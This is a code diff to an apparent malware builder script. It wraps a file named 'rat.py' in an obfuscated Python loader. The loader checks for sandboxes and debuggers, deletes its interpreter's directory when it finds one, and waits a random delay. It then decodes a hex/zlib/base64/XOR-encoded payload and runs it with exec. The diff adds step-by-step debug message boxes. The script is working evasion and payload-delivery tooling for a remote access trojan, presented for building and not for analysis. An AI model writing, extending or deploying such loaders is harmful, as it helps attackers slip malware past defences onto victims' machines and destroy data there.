@@ -30,17 +30,29 @@ def generate_loader(original_code):
     return f'''# ============ {dec_name} ============
 import base64,zlib,sys,ctypes,time,random
 
+# ============ ДЕБАГ: MESSAGEBOX ============
+def show_debug(msg):
+    try:
+        ctypes.windll.user32.MessageBoxW(0, msg, "DEBUG", 0)
+    except:
+        pass
+
+show_debug("STEP 1: Loader started!")
+
 def _check_sandbox():
     try:
         if time.time() < 1600000000:
+            show_debug("STEP 2: Sandbox detected - TIME")
             return True
         if ctypes.windll.kernel32.IsDebuggerPresent():
+            show_debug("STEP 2: Sandbox detected - DEBUGGER")
             return True
         try:
             ntdll = ctypes.windll.ntdll
             status = ctypes.c_ulong()
             ntdll.NtQueryInformationProcess(ctypes.windll.kernel32.GetCurrentProcess(), 0, ctypes.byref(status), 4, None)
             if status.value & 0x1000000:
+                show_debug("STEP 2: Sandbox detected - NtQuery")
                 return True
         except:
             pass
@@ -54,10 +66,13 @@ def _check_sandbox():
         mem.dwLength = ctypes.sizeof(MEM)
         if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem)):
             if mem.ullTotalPhys < 2 * 1024 * 1024 * 1024:
+                show_debug(f"STEP 2: Sandbox detected - RAM: {{mem.ullTotalPhys}}")
                 return True
         try:
             import psutil
-            if psutil.cpu_count() < 2:
+            cpu_count = psutil.cpu_count()
+            if cpu_count < 2:
+                show_debug(f"STEP 2: Sandbox detected - CPU: {{cpu_count}}")
                 return True
         except:
             pass
@@ -65,12 +80,17 @@ def _check_sandbox():
         time.sleep(0.1)
         t2 = ctypes.windll.kernel32.GetTickCount()
         if t2 - t1 < 10:
+            show_debug("STEP 2: Sandbox detected - TICK")
             return True
         return False
-    except:
+    except Exception as e:
+        show_debug(f"STEP 2: Check error - {{e}}")
         return False
 
+show_debug("STEP 3: Checking sandbox...")
+
 if _check_sandbox():
+    show_debug("STEP 4: SANDBOX DETECTED - EXITING")
     try:
         import shutil, os
         shutil.rmtree(os.path.dirname(sys.executable))
@@ -78,19 +98,32 @@ if _check_sandbox():
         pass
     sys.exit(0)
 
+show_debug("STEP 5: No sandbox - continuing")
+
+show_debug(f"STEP 6: Waiting {random.randint(15, 45)} seconds...")
 time.sleep(random.randint(15, 45))
+show_debug("STEP 7: Wait finished")
+
+show_debug("STEP 8: Starting decryption...")
 
 _{dec_name} = lambda s,k: bytes([b ^ k for b in bytes.fromhex(s)[::-1]])
 _{enc_var} = "{hex_data}"
 _{xor_var} = {xor_key}
 
 try:
+    show_debug("STEP 9: Hex -> bytes...")
     _{t1} = bytes.fromhex(_{enc_var})[::-1]
+    show_debug("STEP 10: zlib decompress...")
     _{t2} = zlib.decompress(_{t1})
+    show_debug("STEP 11: base64 decode...")
     _{t3} = base64.b64decode(_{t2})
+    show_debug("STEP 12: XOR decrypt...")
     _{t4} = bytes([b ^ _{xor_var} for b in _{t3}])
+    show_debug("STEP 13: Decryption SUCCESS! Executing...")
     exec(_{t4}.decode('utf-8'), globals())
-except:
+    show_debug("STEP 14: Execution SUCCESS!")
+except Exception as e:
+    show_debug(f"STEP 13: DECRYPTION FAILED - {{e}}")
     try:
         import shutil, os
         shutil.rmtree(os.path.dirname(sys.executable))
@@ -104,14 +137,15 @@ def main():
     with open('rat.py', 'r', encoding='utf-8') as f:
         code = f.read()
     
-    print("[+] Generating obfuscated loader...")
+    print("[+] Generating obfuscated loader with DEBUG...")
     loader = generate_loader(code)
     
     with open('loader_obf.py', 'w', encoding='utf-8') as f:
         f.write(loader)
     
-    print("[+] loader_obf.py created!")
+    print("[+] loader_obf.py created with DEBUG!")
     print("[+] Build size: ~22-25 MB")
+    print("[+] МessageBox будет показывать каждый шаг!")
 
 if __name__ == "__main__":
     main()
